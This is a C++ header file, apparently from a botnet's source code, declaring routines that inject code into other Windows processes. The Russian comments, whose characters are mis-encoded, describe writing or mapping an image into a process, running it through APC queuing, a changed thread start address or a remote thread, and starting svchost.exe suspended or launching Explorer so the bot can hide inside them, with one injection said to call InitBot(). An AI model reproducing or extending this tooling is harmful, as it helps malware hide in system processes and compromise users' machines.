#pragma once

#include "core\core.h"

typedef SIZE_T (*typeInjectCode )( HANDLE hprocess, typeFuncThread startFunc, HMODULE* newBaseImage );
typedef bool (*typeRunInjectCode)( HANDLE hprocess, HANDLE hthread, typeFuncThread startFunc, typeInjectCode func );

//инжект кода в процесс использу€ запись образа в процесс возвращает, адрес запускаемой функции
SIZE_T InjectCode( HANDLE hprocess, typeFuncThread startFunc, HMODULE* newBaseImage );
//инжект кода в процесс использу€ проецировани€ образа в процесс, возвращает адрес запускаемой функции
SIZE_T InjectCode2( HANDLE hprocess, typeFuncThread startFunc, HMODULE* newBaseImage );

//запуск образа через установки потока в очередь ассинхронных вызовов
bool RunInjectCode( HANDLE hprocess, HANDLE hthread, typeFuncThread startFunc, typeInjectCode func );
//запуск образа через изменени€ адреса старта потока
bool RunInjectCode2( HANDLE hprocess, HANDLE hthread, typeFuncThread startFunc, typeInjectCode func );
//запуск образа через запуск потока указанного процеса
bool RunInjectCode3( HANDLE hprocess, HANDLE hthread, typeFuncThread startFunc, typeInjectCode func );

DWORD JmpToSvchost( typeRunInjectCode funcRunInjectCode, typeInjectCode funcInjectCode, typeFuncThread func, const char* exeDonor, const char* nameUser = 0 );

inline DWORD JmpToSvchost1( typeFuncThread func, const char* exeDonor, const char* nameUser = 0 )
{
	return JmpToSvchost( &RunInjectCode, &InjectCode2, func, exeDonor, nameUser );
}

inline DWORD JmpToSvchost2( typeFuncThread func, const char* exeDonor, const char* nameUser = 0 )
{
	return JmpToSvchost( &RunInjectCode2, &InjectCode, func, exeDonor, nameUser );
}
//стартует svchost.exe одним из способов, возвращает pid запущенного процесса
DWORD JmpToSvchost( typeFuncThread func, const char* exeDonor, const char* nameUser = 0 );

//запускает Explorer и инжектитс€ в него
bool JmpToExplorer( typeFuncThread func );
//инжектитс€ в проводник специальным алгоритмом, в этом инжекте запускаетс€ функци€ InitBot(), поэтому в func ее вызывать не нужно
bool InjectToExplorer32( typeFuncThread func );
//инжект в процесс с помощью InjectCode
bool InjectIntoProcess1( DWORD pid, typeFuncThread func );
//инжект в процесс с помощью InjectCode2
bool InjectIntoProcess2( DWORD pid, typeFuncThread func );
//инжект в процесс с помощью InjectCode и запуск через RunInjectCode
bool InjectIntoProcess3( DWORD pid, HANDLE hthread, typeFuncThread func );
//запуск svchost в режиме паузы, с целью дальнейшего внедрени€ в него
DWORD RunSvchost( HANDLE* hprocess, HANDLE* hthread, const char*exeDonor, const char* nameUser = 0 );
